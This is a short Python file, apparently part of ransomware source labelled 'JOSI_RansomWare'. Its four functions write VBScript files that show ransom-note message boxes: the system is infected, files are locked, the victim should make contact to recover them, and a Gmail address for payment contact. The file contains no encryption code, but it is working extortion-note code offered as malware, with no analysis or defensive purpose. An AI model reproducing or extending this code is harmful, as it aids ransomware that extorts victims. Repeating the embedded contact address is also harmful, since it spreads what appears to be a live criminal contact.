def box():
	with open("box.vbs", "x") as file:
		file.close()
	with open("box.vbs", "w") as file:
		file.write('MsgBox "This System Is Infected By JOSI_RansomWare !!!", vbOKOnly + vbInformation, "JOSI_RansomWare"')
		



def box2():
	with open("box2.vbs", "x") as file:
		file.close()
	with open("box2.vbs", "w") as file:
		file.write('MsgBox "Your Files Is Locked.", vbOKOnly + vbInformation, "JOSI_RansomWare"')


def box3():
	with open("box3.vbs", "x") as file:
		file.close()
	with open("box3.vbs", "w") as file:
		file.write('MsgBox "Contact Us To Recover Your Files.", vbOKOnly + vbInformation, "JOSI_RansomWare"')


def box4():
	with open("box4.vbs", "x") as file:
		file.close()
	with open("box4.vbs", "w") as file:
		file.write('MsgBox "Email = hxbno00100@gmail.com", vbOKOnly + vbInformation, "JOSI_RansomWare"')